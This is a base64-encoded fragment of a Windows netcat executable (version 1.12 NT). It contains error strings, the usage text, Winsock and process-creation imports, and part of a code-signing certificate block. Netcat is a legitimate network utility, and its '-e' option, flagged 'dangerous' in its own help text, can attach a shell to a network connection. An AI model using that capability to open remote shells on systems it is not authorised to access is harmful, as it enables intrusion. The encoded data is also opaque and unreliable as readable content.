QoASU5UUiAgICAgICAgICAAQkFERiAgICAgICAgICAAQUNDRVMgICAgICAgICAARkFVTFQgICAgICAgICAASU5WQUwgICAgICAgICAATUZJTEUgICAgICAgICAAV09VTERCTE9DSyAgICAASU5QUk9HUkVTUyAgICAAQUxSRUFEWSAgICAgICAATk9UU09DSyAgICAgICAAREVTVEFERFJSRVEgICAATVNHU0laRSAgICAgICAAUFJPVE9UWVBFICAgICAATk9QUk9UT09QVCAgICAAUFJPVE9OT1NVUFBPUlQAU09DS1ROT1NVUFBPUlQAT1BOT1RTVVBQICAgICAAUEZOT1NVUFBPUlQgICAAQUZOT1NVUFBPUlQgICAAQUREUklOVVNFICAgICAAQUREUk5PVEFWQUlMICAATkVURE9XTiAgICAgICAATkVUVU5SRUFDSCAgICAATkVUUkVTRVQgICAgICAAQ09OTkFCT1JURUQgICAAQ09OTlJFU0VUICAgICAATk9CVUZTICAgICAgICAASVNDT05OICAgICAgICAATk9UQ09OTiAgICAgICAAU0hVVERPV04gICAgICAAVE9PTUFOWVJFRlMgICAAVElNRURPVVQgICAgICAAY29ubmVjdGlvbiByZWZ1c2VkAExPT1AgICAgICAgICAgAE5BTUVUT09MT05HICAgAEhPU1RET1dOICAgICAgAEhPU1RVTlJFQUNIICAgAE5PVEVNUFRZICAgICAgAFBST0NMSU0gICAgICAgAFVTRVJTICAgICAgICAgAERRVU9UICAgICAgICAgAFNUQUxFICAgICAgICAgAFJFTU9URSAgICAgICAgAERJU0NPTiAgICAgICAgAFNZU05PVFJFQURZICAgIABWRVJOT1RTVVBQT1JURUQATk9USU5JVElBTElTRUQgAEhPU1RfTk9UX0ZPVU5EIABUUllfQUdBSU4gICAgICAATk9fUkVDT1ZFUlkgICAgAE5PX0RBVEEgICAgICAgIAB1bmtub3duIHNvY2tldCBlcnJvcgA6ICVzCgAgcHVudCEAc3B1cmlvdXMgdGltZXIgaW50ZXJydXB0IQBIbWFsbG9jICVkIGZhaWxlZAAAAEROUyBmd2QvcmV2IG1pc21hdGNoOiAlcyAhPSAlcwBnZXRob3N0cG9vcCBmdXhvcmVkAABDYW4ndCBwYXJzZSAlcyBhcyBhbiBJUCBhZGRyZXNzACVzOiBmb3J3YXJkIGhvc3QgbG9va3VwIGZhaWxlZDogaF9lcnJubyAlZAAAV2FybmluZzogaW52ZXJzZSBob3N0IGxvb2t1cCBmYWlsZWQgZm9yICVzOiBoX2Vycm5vICVkAAAlczogaW52ZXJzZSBob3N0IGxvb2t1cCBmYWlsZWQ6IGhfZXJybm8gJWQAAFdhcm5pbmc6IGZvcndhcmQgaG9zdCBsb29rdXAgZmFpbGVkIGZvciAlczogaF9lcnJubyAlZAAAV2FybmluZzogcG9ydC1ieW51bSBtaXNtYXRjaCwgJWQgIT0gJWQAJWQAbG9hZHBvcnRzOiBubyBibG9jaz8hAGxvYWRwb3J0czogYm9ndXMgdmFsdWVzICVkLCAlZABDYW4ndCBnZXQgc29ja2V0AG5uZXRmZCByZXVzZWFkZHIgZmFpbGVkAHJldHJ5aW5nIGxvY2FsICVzOiVkAENhbid0IGdyYWIgJXM6JWQgd2l0aCBiaW5kAFdhcm5pbmc6IHNvdXJjZSByb3V0aW5nIHVuYXZhaWxhYmxlIG9uIHRoaXMgbWFjaGluZSwgaWdub3JpbmcAVURQIGxpc3RlbiBuZWVkcyAtcCBhcmcAbG9jYWwgbGlzdGVuIGZ1eG9yZWQAbG9jYWwgZ2V0c29ja25hbWUgZmFpbGVkAGxpc3RlbmluZyBvbiBbAGFueQBdICVkIC4uLgBwb3N0LXJjdiBnZXRzb2NrbmFtZSBmYWlsZWQAaW52YWxpZCBjb25uZWN0aW9uIHRvIFslc10gZnJvbSAlcyBbJXNdICVkAABjb25uZWN0IHRvIFslc10gZnJvbSAlcyBbJXNdICVkAHVkcHRlc3QgZmlyc3Qgd3JpdGUgZmFpbGVkPyEgZXJybm8gJWQAAABvcHJpbnQgY2FsbGVkIHdpdGggbm8gb3BlbiBmZD8hACU4Ljh4IABvZmQgd3JpdGUgZXJyAHNlbGVjdCBmdXhvcmVkAG5ldCB0aW1lb3V0AA0ACgBQcmVwb3N0ZXJvdXMgUG9pbnRlcnM6ICVkLCAlZAB0b28gbWFueSBvdXRwdXQgcmV0cmllcwBDbWQgbGluZTogAHdyb25nAGFsbC1BLXJlY29yZHMgTklZAAAAAGludmFsaWQgaG9wIHBvaW50ZXIgJWQsIG11c3QgYmUgbXVsdGlwbGUgb2YgNCA8PSAyOAB0b28gbWFueSAtZyBob3BzAGludmFsaWQgaW50ZXJ2YWwgdGltZSAlcwBpbnZhbGlkIGxvY2FsIHBvcnQgJXMAaW52YWxpZCB3YWl0LXRpbWUgJXMAbmMgLWggZm9yIGhlbHAAYWRlOmc6RzpoaTpsTG5vOnA6cnM6dGN1dnc6egBjYW4ndCBvcGVuICVzAGludmFsaWQgcG9ydCAlcwBubyBjb25uZWN0aW9uAG5vIGRlc3RpbmF0aW9uAG5vIHBvcnRbc10gdG8gY29ubmVjdCB0bwAlcyBbJXNdICVkICglcykgb3BlbgAlcyBbJXNdICVkICglcykAc2VudCAlZCwgcmN2ZCAlZAAA80xAAJpPQACaT0AAmk9AAJpPQADNTEAAmk9AAJpPQACaT0AAmk9AAJpPQACaT0AAmk9AAJpPQACaT0AAmk9AAJpPQACaT0AAmk9AAJpPQACaT0AAmk9AAJpPQACaT0AAmk9AAJpPQACdTEAAmk9AAOhOQADpTEAAvkxAAJpPQAAvTUAAq01AALtNQACaT0AAmk9AAAlOQACaT0AAHk5AADNOQABSTkAAmk9AAJBOQAClTkAA005AAP1OQAAST0AAJ09AAJpPQACaT0AAiE9AAFt2MS4xMiBOVCBodHRwOi8vZXRlcm5hbGx5Ym9yZWQub3JnL21pc2MvbmV0Y2F0L10KY29ubmVjdCB0byBzb21ld2hlcmU6CW5jIFstb3B0aW9uc10gaG9zdG5hbWUgcG9ydFtzXSBbcG9ydHNdIC4uLiAKbGlzdGVuIGZvciBpbmJvdW5kOgluYyAtbCAtcCBwb3J0IFtvcHRpb25zXSBbaG9zdG5hbWVdIFtwb3J0XQpvcHRpb25zOgAACS1kCQlkZXRhY2ggZnJvbSBjb25zb2xlLCBiYWNrZ3JvdW5kIG1vZGUKAAAJLWUgcHJvZwkJaW5ib3VuZCBwcm9ncmFtIHRvIGV4ZWMgW2Rhbmdlcm91cyEhXQAJLWcgZ2F0ZXdheQlzb3VyY2Utcm91dGluZyBob3AgcG9pbnRbc10sIHVwIHRvIDgKCS1HIG51bQkJc291cmNlLXJvdXRpbmcgcG9pbnRlcjogNCwgOCwgMTIsIC4uLgoJLWgJCXRoaXMgY3J1ZnQKCS1pIHNlY3MJCWRlbGF5IGludGVydmFsIGZvciBsaW5lcyBzZW50LCBwb3J0cyBzY2FubmVkCgktbAkJbGlzdGVuIG1vZGUsIGZvciBpbmJvdW5kIGNvbm5lY3RzCgktTAkJbGlzdGVuIGhhcmRlciwgcmUtbGlzdGVuIG9uIHNvY2tldCBjbG9zZQoJLW4JCW51bWVyaWMtb25seSBJUCBhZGRyZXNzZXMsIG5vIEROUwoJLW8gZmlsZQkJaGV4IGR1bXAgb2YgdHJhZmZpYwoJLXAgcG9ydAkJbG9jYWwgcG9ydCBudW1iZXIKCS1yCQlyYW5kb21pemUgbG9jYWwgYW5kIHJlbW90ZSBwb3J0cwoJLXMgYWRkcgkJbG9jYWwgc291cmNlIGFkZHJlc3MAAAAJLXQJCWFuc3dlciBURUxORVQgbmVnb3RpYXRpb24AAAktYwkJc2VuZCBDUkxGIGluc3RlYWQgb2YganVzdCBMRgoJLXUJCVVEUCBtb2RlCgktdgkJdmVyYm9zZSBbdXNlIHR3aWNlIHRvIGJlIG1vcmUgdmVyYm9zZV0KCS13IHNlY3MJCXRpbWVvdXQgZm9yIGNvbm5lY3RzIGFuZCBmaW5hbCBuZXQgcmVhZHMKCS16CQl6ZXJvLUkvTyBtb2RlIFt1c2VkIGZvciBzY2FubmluZ10AAABwb3J0IG51bWJlcnMgY2FuIGJlIGluZGl2aWR1YWwgb3IgcmFuZ2VzOiBtLW4gW2luY2x1c2l2ZV0AAABtaW5nd20xMC5kbGwAX19taW5nd3Rocl9yZW1vdmVfa2V5X2R0b3IAX19taW5nd3Rocl9rZXlfZHRvcgAgWEAATWluZ3cgcnVudGltZSBmYWlsdXJlOgoAICBWaXJ0dWFsUXVlcnkgZmFpbGVkIGZvciAlZCBieXRlcyBhdCBhZGRyZXNzICVwAAAAACAgVW5rbm93biBwc2V1ZG8gcmVsb2NhdGlvbiBwcm90b2NvbCB2ZXJzaW9uICVkLgoAAAAgIFVua25vd24gcHNldWRvIHJlbG9jYXRpb24gYml0IHNpemUgJWQuCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZLAAAAAAAAAAAAAA5LkAACiyAADksAAAAAAAAAAAAAAYugAAqLIAAAyxAAAAAAAAAAAAANC6AADQsgAAvLEAAAAAAAAAAAAARLsAAICzAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOyzAAD6swAACLQAABq0AAAqtAAAQrQAAFi0AABqtAAAgrQAAJC0AACetAAArLQAALq0AADOtAAA3rQAAPK0AAAEtQAAFLUAADC1AABItQAAWLUAAGi1AAB0tQAAkrUAAJq1AACutQAAwLUAAM61AADgtQAA8LUAAAq2AAAAAAAAFrYAACC2AAAotgAAMLYAADq2AABCtgAASrYAAFa2AABitgAAAAAAAGy2AAB8tgAAjLYAAJq2AACstgAAtrYAAMC2AADItgAA0rYAANy2AADmtgAA8rYAAPy2AAAItwAAELcAABq3AAAitwAALLcAADS3AAA+twAASLcAAFC3AABYtwAAYrcAAGy3AAB0twAAfrcAAIi3AACStwAAnLcAAKa3AACutwAAuLcAAMK3AADKtwAA1LcAAN63AADotwAA8rcAAPy3AAAGuAAAELgAABi4AAAAAAAAJLgAADK4AABEuAAAVrgAAGS4AAB0uAAAfrgAAIa4AACUuAAAnrgAAK64AAC+uAAAzrgAAN64AADsuAAA9LgAAAC5AAAMuQAAFrkAAB65AAAmuQAAMrkAADy5AABEuQAAUrkAAF65AAAAAAAA7LMAAPqzAAAItAAAGrQAACq0AABCtAAAWLQAAGq0AACCtAAAkLQAAJ60AACstAAAurQAAM60AADetAAA8rQAAAS1AAAUtQAAMLUAAEi1AABYtQAAaLUAAHS1AACStQAAmrUAAK61AADAtQAAzrUAAOC1AADwtQAACrYAAAAAAAAWtgAAILYAACi2AAAwtgAAOrYAAEK2AABKtgAAVrYAAGK2AAAAAAAAbLYAAHy2AACMtgAAmrYAAKy2AAC2tgAAwLYAAMi2AADStgAA3LYAAOa2AADytgAA/LYAAAi3AAAQtwAAGrcAACK3AAAstwAANLcAAD63AABItwAAULcAAFi3AABitwAAbLcAAHS3AAB+twAAiLcAAJK3AACctwAAprcAAK63AAC4twAAwrcAAMq3AADUtwAA3rcAAOi3AADytwAA/LcAAAa4AAAQuAAAGLgAAAAAAAAkuAAAMrgAAES4AABWuAAAZLgAAHS4AAB+uAAAhrgAAJS4AACeuAAArrgAAL64AADOuAAA3rgAAOy4AAD0uAAAALkAAAy5AAAWuQAAHrkAACa5AAAyuQAAPLkAAES5AABSuQAAXrkAAAAAAABSAENsb3NlSGFuZGxlAKAAQ3JlYXRlUGlwZQAAowBDcmVhdGVQcm9jZXNzQQAAswBDcmVhdGVUaHJlYWQAAM8ARGVsZXRlQ3JpdGljYWxTZWN0aW9uAN8ARGlzY29ubmVjdE5hbWVkUGlwZQDmAER1cGxpY2F0ZUhhbmRsZQDsAEVudGVyQ3JpdGljYWxTZWN0aW9uAAAXAUV4aXRQcm9jZXNzABgBRXhpdFRocmVhZAAAXQFGcmVlQ29uc29sZQBgAUZyZWVMaWJyYXJ5AL4BR2V0Q3VycmVudFByb2Nlc3MA/gFHZXRMYXN0RXJyb3IAABECR2V0TW9kdWxlSGFuZGxlQQAAQQJHZXRQcm9jQWRkcmVzcwAAYAJHZXRTdGRIYW5kbGUAAN4CSW5pdGlhbGl6ZUNyaXRpY2FsU2VjdGlvbgAuA0xlYXZlQ3JpdGljYWxTZWN0aW9uAAAxA0xvYWRMaWJyYXJ5QQAAgANQZWVrTmFtZWRQaXBlALMDUmVhZEZpbGUAAHQEU2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAIAEU2xlZXAAjgRUZXJtaW5hdGVQcm9jZXNzAACPBFRlcm1pbmF0ZVRocmVhZACVBFRsc0dldFZhbHVlAL0EVmlydHVhbFByb3RlY3QAAL8EVmlydHVhbFF1ZXJ5AADFBFdhaXRGb3JNdWx0aXBsZU9iamVjdHMAAPMEV3JpdGVGaWxlAAYAX2Nsb3NlAAAKAF9kdXAAACsAX2l0b2EALwBfa2JoaXQAADoAX29wZW4AQABfcmVhZABPAF9zdHJjbXBpAABUAF9zdHJuaWNtcABtAF93cml0ZQAANwBfX2dldG1haW5hcmdzAE0AX19wX19lbnZpcm9uAABPAF9fcF9fZm1vZGUAAGMAX19zZXRfYXBwX3R5cGUAAJMAX2NleGl0AAC2AF9lcnJubwAACgFfaW9iAAALAV9pc2F0dHkAfwFfb25leGl0AKYBX3NldGptcACqAV9zZXRtb2RlAACsAV9zbGVlcAAAGgJfd2lubWFqb3IARwJhYm9ydABOAmF0ZXhpdAAAUAJhdG9pAABTAmNhbGxvYwAAXAJleGl0AABiAmZmbHVzaAAAawJmcHJpbnRmAGwCZnB1dGMAcQJmcmVlAAB5AmZ3cml0ZQAAfQJnZXRlbnYAAH4CZ2V0cwAAowJsb25nam1wAKQCbWFsbG9jAACpAm1lbWNtcAAAqgJtZW1jcHkAAKwCbWVtc2V0AAC5AnJhbmQAAMICc2lnbmFsAADFAnNwcmludGYAxwJzcmFuZADJAnN0cmNhdAAAygJzdHJjaHIAAMsCc3RyY21wAADNAnN0cmNweQAA0QJzdHJsZW4AANMCc3RybmNtcADUAnN0cm5jcHkA4wJ0aW1lAADsAnZmcHJpbnRmAAAZAFdTQUNsZWFudXAAABoAV1NBR2V0TGFzdEVycm9yAB4AV1NBU2V0TGFzdEVycm9yAB8AV1NBU3RhcnR1cAAAIgBfX1dTQUZESXNTZXQAACMAYWNjZXB0AAAkAGJpbmQAACUAY2xvc2Vzb2NrZXQAJgBjb25uZWN0ACgAZ2V0aG9zdGJ5YWRkcgApAGdldGhvc3RieW5hbWUALwBnZXRzZXJ2YnluYW1lADAAZ2V0c2VydmJ5cG9ydAAxAGdldHNvY2tuYW1lADQAaHRvbnMANQBpbmV0X2FkZHIANwBpbmV0X250b2EAOQBsaXN0ZW4AADsAbnRvaHMAPQByZWN2AAA+AHJlY3Zmcm9tAABCAHNlbGVjdAAAQwBzZW5kAABGAHNldHNvY2tvcHQAAEcAc2h1dGRvd24AAEgAc29ja2V0AAAAsAAAALAAAACwAAAAsAAAALAAAACwAAAAsAAAALAAAACwAAAAsAAAALAAAACwAAAAsAAAALAAAACwAAAAsAAAALAAAACwAAAAsAAAALAAAACwAAAAsAAAALAAAACwAAAAsAAAALAAAACwAAAAsAAAALAAAACwAAAAsAAAS0VSTkVMMzIuZGxsAAAAABSwAAAUsAAAFLAAABSwAAAUsAAAFLAAABSwAAAUsAAAFLAAAG1zdmNydC5kbGwAACiwAAAosAAAKLAAACiwAAAosAAAKLAAACiwAAAosAAAKLAAACiwAAAosAAAKLAAACiwAAAosAAAKLAAACiwAAAosAAAKLAAACiwAAAosAAAKLAAACiwAAAosAAAKLAAACiwAAAosAAAKLAAACiwAAAosAAAKLAAACiwAAAosAAAKLAAACiwAAAosAAAKLAAACiwAAAosAAAKLAAACiwAAAosAAAKLAAACiwAABtc3ZjcnQuZGxsAAA8sAAAPLAAADywAAA8sAAAPLAAADywAAA8sAAAPLAAADywAAA8sAAAPLAAADywAAA8sAAAPLAAADywAAA8sAAAPLAAADywAAA8sAAAPLAAADywAAA8sAAAPLAAADywAAA8sAAAPLAAAFdTT0NLMzIuRExMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACBYQADgV0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZ0EAAHNBAAISgQAAEwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANgaAAAAAgIAMIIayAYJKoZIhvcNAQcCoIIauTCCGrUCAQExCzAJBgUrDgMCGgUAMGgGCisGAQQBgjcCAQSgWjBYMDMGCisGAQQBgjcCA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